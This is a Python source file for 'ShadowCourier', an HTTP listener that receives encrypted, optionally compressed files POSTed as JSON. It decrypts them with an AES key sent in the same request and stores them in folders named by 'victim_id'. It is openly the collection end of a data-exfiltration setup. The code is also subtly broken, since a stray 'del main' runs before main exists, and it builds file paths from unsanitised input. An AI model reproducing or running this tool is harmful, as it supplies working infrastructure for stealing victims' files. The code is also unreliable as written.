import http.server
import base64
import gzip
import argparse
import configparser
import os
import json
from pathlib import Path
from Crypto.Cipher import AES
from Crypto.Util.Padding import unpad

def load_config():
    """Grab the server config like a ninja stealing secrets."""
    config = configparser.ConfigParser()
    config['server'] = {
        'port': '8080',
        'upload_dir': '~/ShadowCourier/uploads'  # Default upload spot
    }
    config_files = [
        Path.cwd() / 'shadow.conf',
        Path.home() / '.shadow.conf'
    ]
    for config_file in config_files:
        if config_file.exists():
            config.read(config_file)
            print(f"[*] Loaded config from {config_file}")
            break
    return config

# Load config and set defaults, because nobody likes hardcoding.
config = load_config()
DEFAULT_PORT = int(os.getenv("SHADOW_PORT", config['server']['port']))
DEFAULT_UPLOAD_DIR = os.getenv("SHADOW_UPLOAD_DIR", config['server']['upload_dir'])

class CatchHandler(http.server.BaseHTTPRequestHandler):
    def do_HEAD(self):
        """Handle HEAD requests like a polite server should."""
        if self.path == "/upload":
            self.send_response(200)
            self.send_header("Content-type", "text/plain")
            self.end_headers()
        else:
            self.send_response(404)
            self.end_headers()

    def do_POST(self):
        """Catch those sneaky file uploads and save 'em."""
        if self.path != "/upload":
            print("[!] Invalid path")
            self.send_response(404)
            self.end_headers()
            return

        client_ip = self.client_address[0]
        content_length = int(self.headers.get('Content-Length', 0))
        content_type = self.headers.get('Content-Type', '')

        if content_type != 'application/json':
            print("[!] Invalid Content-Type, expected application/json")
            self.send_response(400)
            self.end_headers()
            return

        try:
            raw_data = self.rfile.read(content_length).decode('utf-8')
            data = json.loads(raw_data)
        except (json.JSONDecodeError, UnicodeDecodeError) as e:
            print(f"[!] JSON parsing error: {e}")
            self.send_response(400)
            self.end_headers()
            return

        # Check for all the juicy fields we need.
        if not all(k in data for k in ['file', 'filename', 'key', 'iv', 'is_compressed', 'victim_id']):
            print("[!] Missing required fields")
            self.send_response(400)
            self.end_headers()
            return

        encoded_data = data['file']
        filename = data['filename']
        key = base64.b64decode(data['key'])
        iv = base64.b64decode(data['iv'])
        is_compressed = data['is_compressed'].lower() == 'true'
        victim_id = data['victim_id'] or client_ip

        print(f"[*] Incoming transmission from {client_ip} (saving as {victim_id})...")
        print(f"[*] File: {filename}, encrypted size: {len(encoded_data)} bytes")

        try:
            # Decrypt like we're cracking a digital safe.
            encrypted_data = base64.b64decode(encoded_data)
            cipher = AES.new(key, AES.MODE_CBC, iv)
            decrypted_data = unpad(cipher.decrypt(encrypted_data), AES.block_size)
            print(f"[*] Decrypted size: {len(decrypted_data)} bytes")

            # Unzip if needed, like popping a compressed file balloon.
            final_data = gzip.decompress(decrypted_data) if is_compressed else decrypted_data
            if is_compressed:
                print(f"[*] Decompressed size: {len(final_data)} bytes")

        except Exception as e:
            print(f"[!] Decryption or decompression error: {e}")
            self.send_response(400)
            self.end_headers()
            return

        # Save the file in a cozy directory.
        file_path = Path(self.server.upload_dir) / victim_id / filename
        file_path.parent.mkdir(parents=True, exist_ok=True)

        with open(file_path, 'wb') as f:
            f.write(final_data)

        print(f"[+] Caught file: {file_path}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"OK")

del main
def main():
    """Fire up the server and let it listen like a cyber hawk."""
    parser = argparse.ArgumentParser(description="ShadowCourier File Server")
    parser.add_argument("--port", type=int, default=DEFAULT_PORT, help="Port to listen on")
    parser.add_argument("--upload-dir", default=DEFAULT_UPLOAD_DIR, help="Where to stash files")
    args = parser.parse_args()

    upload_dir = Path(args.upload_dir)
    upload_dir.mkdir(parents=True, exist_ok=True)

    server = http.server.HTTPServer(('0.0.0.0', args.port), CatchHandler)
    server.upload_dir = args.upload_dir
    print(f"[*] Server online at 0.0.0.0:{args.port}, saving to {args.upload_dir}...")
    server.serve_forever()

if __name__ == "__main__":
    main()